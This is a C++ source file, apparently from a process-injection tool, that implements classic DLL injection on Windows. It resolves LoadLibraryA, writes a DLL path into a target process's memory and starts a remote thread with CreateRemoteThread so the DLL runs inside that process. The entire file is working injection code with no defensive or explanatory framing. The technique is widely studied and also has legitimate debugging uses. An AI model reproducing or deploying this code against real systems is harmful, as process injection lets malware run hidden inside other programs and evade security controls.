#include "executors/ll.h"
#include <windows.h>

#ifdef DEBUG
#include <errhandlingapi.h>
#include <iostream>
#endif

LL::LL() {}

LL::~LL() {}

BOOL LL::execute(MemoryWriter *mw, LPVOID data_to_write, DWORD data_size) {
  // find LoadLibraryA addr
  LPTHREAD_START_ROUTINE load_library_address =
      (LPTHREAD_START_ROUTINE)GetProcAddress(
          GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");

  if (load_library_address == NULL) {
#ifdef DEBUG
    std::cerr << "Failed to locate LoadLibraryA in target process. Error Code: "
              << GetLastError() << std::endl;
#endif
    return FALSE;
  }

  // write dll path to memory
  DWORD_PTR addr = mw->write(data_to_write, data_size, NULL, PAGE_READWRITE);
  if (addr == NULL) {
#ifdef DEBUG
    std::cerr << "Failed to write to memory. Error code: " << GetLastError()
              << std::endl;
#endif
    return FALSE;
  }
#ifdef DEBUG
  printf("Written payload to %p\n", addr);
#endif

  // start remote thread in target process that loads our DLL in
  // this works because LoadLibraryA() will call DllMain() of the
  // DLL it loads if it has not already been loaded
  HANDLE new_thread_address =
      CreateRemoteThread(mw->get_target_process(), NULL, 0,
                         load_library_address, (LPVOID)addr, 0, NULL);
  if (new_thread_address == NULL) {
#ifdef DEBUG
    std::cerr << "Failed to load DLL in target process. Error code: "
              << GetLastError() << std::endl;
#endif
    return FALSE;
  }
#ifdef DEBUG
  std::cout << "Successfully injected DLL" << std::endl;
#endif
  return TRUE;
}
